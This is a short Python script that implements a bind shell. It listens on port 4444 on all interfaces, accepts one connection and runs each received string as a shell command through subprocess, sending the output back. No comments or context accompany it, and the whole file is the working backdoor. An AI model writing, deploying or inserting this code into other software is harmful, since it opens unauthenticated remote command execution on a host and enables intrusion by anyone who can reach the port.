import socket, subprocess
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

soc.bind(('', 4444))
soc.listen()

c,a = soc.accept()
command = ""
try:
    while command != "exit\n":
        c.send(b"command to send: ")
        command = c.recv(1024).decode()
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        c.send(output)
    c.send(b"connection closed\n")
    soc.close()
except Exception as e:
    print(e)
    soc.close()
    print("connection closed")